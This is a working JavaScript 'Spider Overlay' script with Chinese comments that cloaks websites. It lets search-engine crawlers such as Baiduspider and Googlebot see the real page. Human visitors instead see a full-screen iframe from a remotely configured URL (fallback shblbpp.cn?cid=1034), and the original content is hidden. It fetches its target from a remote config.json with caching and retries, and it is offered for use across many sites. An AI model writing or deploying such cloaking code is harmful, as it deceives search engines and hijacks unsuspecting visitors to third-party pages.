/**
 * Spider Overlay v2.2
 *
 * 所有项目只需引入这一个文件，不需要任何配置。
 * 跳转目标、爬虫列表全部由同目录下的 config.json 统一控制。
 *
 * 用法（所有项目完全一样）：
 *   <script src="https://你的域名/spider-overlay.js"></script>
 *
 * v2.2 改进：
 * - 缓存 TTL 延长到 30 分钟
 * - config.json 拉取失败自动重试 3 次（间隔 1s/2s）
 * - 优先顺序：远程 config.json > localStorage 缓存 > FALLBACK_CONFIG（最后兜底）
 * - 配合服务端 CORS 头，config.json 跨域可用，兜底几乎永不需要
 */

(function () {
  'use strict';

  // 最后兜底：当 config.json 拉不到且缓存为空时使用
  // 正常情况下不会走到这里（有 CORS + 缓存保护）
  var FALLBACK_CONFIG = {
    targetUrl: 'https://s8-1.shblbpp.cn?cid=1034',
    enabled: true,
    spiders: ['baiduspider','sogou web spider','yisouspider','360spider','googlebot','bingbot'],
    zIndex: 9999,
    bgColor: 'white'
  };

  var CACHE_KEY = '__so_cfg__';
  var CACHE_TTL = 30 * 60 * 1000; // 30 分钟 —— 旧缓存也远比兜底值可靠

  // ======================== 自动推断 config.json 地址 ========================
  function getCurrentScript() {
    if (document.currentScript) return document.currentScript;
    var scripts = document.getElementsByTagName('script');
    for (var i = scripts.length - 1; i >= 0; i--) {
      if (scripts[i].src && scripts[i].src.indexOf('spider-overlay.js') > -1) {
        return scripts[i];
      }
    }
    return null;
  }

  var scriptEl = getCurrentScript();
  var configUrl = '';

  // 优先 data-config 属性，否则自动推导为同目录下的 config.json
  if (scriptEl) {
    configUrl = scriptEl.getAttribute('data-config') || '';
    if (!configUrl && scriptEl.src) {
      configUrl = scriptEl.src.replace(/spider-overlay\.js(\?.*)?$/, 'config.json');
    }
  }

  // ======================== 加载配置 ========================
  function loadConfig(cb) {
    // 1. 读缓存（30 分钟有效）
    try {
      var cached = JSON.parse(localStorage.getItem(CACHE_KEY));
      if (cached && cached._ts && (Date.now() - cached._ts < CACHE_TTL) && cached.targetUrl) {
        cb(cached);
        refreshCache(); // 后台静默刷新
        return;
      }
    } catch(e) {}

    // 2. fetch 远程配置
    fetchConfigWithRetry(cb);
  }

  // 带重试的 fetch：最多 3 次，间隔 1s / 2s
  function fetchConfigWithRetry(cb, attempt) {
    attempt = attempt || 0;
    if (attempt >= 3) {
      // 3 次都失败 → 降级：过期缓存 > 不激活
      try {
        var old = JSON.parse(localStorage.getItem(CACHE_KEY));
        if (old && old.targetUrl) { cb(old); return; }
      } catch(e) {}
      // 最终兜底：不激活（targetUrl 为空时 applyOverlay 会跳过）
      cb(FALLBACK_CONFIG);
      return;
    }
    if (!configUrl) {
      cb(FALLBACK_CONFIG);
      return;
    }
    fetch(configUrl, { cache: 'no-cache' })
      .then(function(r) { return r.ok ? r.json() : Promise.reject('HTTP ' + r.status); })
      .then(function(cfg) {
        cfg._ts = Date.now();
        try { localStorage.setItem(CACHE_KEY, JSON.stringify(cfg)); } catch(e) {}
        cb(cfg);
      })
      .catch(function() {
        // 重试，间隔递增：1s, 2s
        setTimeout(function() {
          fetchConfigWithRetry(cb, attempt + 1);
        }, (attempt + 1) * 1000);
      });
  }

  function refreshCache() {
    if (!configUrl) return;
    fetch(configUrl, { cache: 'no-cache' })
      .then(function(r) { return r.ok ? r.json() : null; })
      .then(function(cfg) {
        if (cfg) {
          cfg._ts = Date.now();
          try { localStorage.setItem(CACHE_KEY, JSON.stringify(cfg)); } catch(e) {}
        }
      })
      .catch(function() {});
  }

  // ======================== 核心 ========================
  function isSpider(spiders) {
    var ua = navigator.userAgent.toLowerCase();
    for (var i = 0; i < spiders.length; i++) {
      if (ua.indexOf(spiders[i].toLowerCase()) > -1) return true;
    }
    return false;
  }

  function applyOverlay(cfg) {
    if (!cfg || cfg.enabled === false) return;
    if (!cfg.targetUrl) return; // 没有有效链接就不跳（宁可不跳也不跳到旧链接）
    if (isSpider(cfg.spiders)) return;

    function insert() {
      if (document.getElementById('spider-overlay-iframe')) return;
      var body = document.body;
      if (!body) { window.addEventListener('load', insert); return; }

      var iframe = document.createElement('iframe');
      iframe.id = 'spider-overlay-iframe';
      iframe.src = cfg.targetUrl;
      iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-popups allow-forms');
      iframe.style.cssText =
        'position:fixed!important;top:0!important;left:0!important;' +
        'width:100vw!important;height:100vh!important;border:none!important;' +
        'z-index:' + (cfg.zIndex || 9999) + '!important;' +
        'background:' + (cfg.bgColor || 'white') + '!important;' +
        'margin:0!important;padding:0!important;';
      body.appendChild(iframe);

      // 等 iframe 加载成功后再隐藏原始内容
      var hidden = false;
      function hideOriginals() {
        if (hidden) return; hidden = true;
        for (var i = 0; i < body.children.length; i++) {
          if (body.children[i] !== iframe) body.children[i].style.display = 'none';
        }
      }
      iframe.addEventListener('load', hideOriginals);
      // 兜底：3 秒后无论如何都隐藏（避免永久白屏）
      setTimeout(hideOriginals, 3000);
    }

    // 等 React/页面渲染完成后再执行，避免 Safari 白屏
    requestAnimationFrame(function() { requestAnimationFrame(insert); });
  }

  loadConfig(applyOverlay);

  // 调试 API（生产环境可通过 enabled=false 关闭）
  window.SpiderOverlay = {
    clearCache: function() {
      try { localStorage.removeItem(CACHE_KEY); } catch(e) {}
      location.reload();
    }
  };

})();
